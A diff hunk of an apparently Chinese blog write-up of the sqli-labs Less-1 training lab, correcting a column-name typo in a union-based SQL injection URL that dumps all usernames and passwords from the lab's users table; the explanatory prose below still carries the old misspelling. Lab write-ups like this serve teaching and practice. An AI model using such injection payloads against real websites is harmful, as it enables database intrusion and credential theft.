@@ -241,7 +241,7 @@
 <p><img src="/2021/10/04/sqli-labs-Less1/a4.png" alt></p>
 <p><strong>column_name(s)</strong> 数据库表中所有列的名称,<strong>column_name</strong>是一个列名称</p>
 <h5 id="八、查询账号和密码">八、查询账号和密码</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqil-labs-master/Less-1/?id=1&#x27;union select 1,2,group_concat(concat_ws(&#x27;~&#x27;,usename,password)) from security.users--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqil-labs-master/Less-1/?id=1&#x27;union select 1,2,group_concat(concat_ws(&#x27;~&#x27;,username,password)) from security.users--+</span><br></pre></td></tr></table></figure>
 <p><img src="/2021/10/04/sqli-labs-Less1/jieshu1.png" alt></p>
 <p>到这里意味着Less-1已经成功解开！！！</p>
 <p>group_concat(concat_ws(‘~’,usename,password)) from security.users–+ 直接可以得到所有的账号和密码，并且使用’~'符号进行分割。</p>
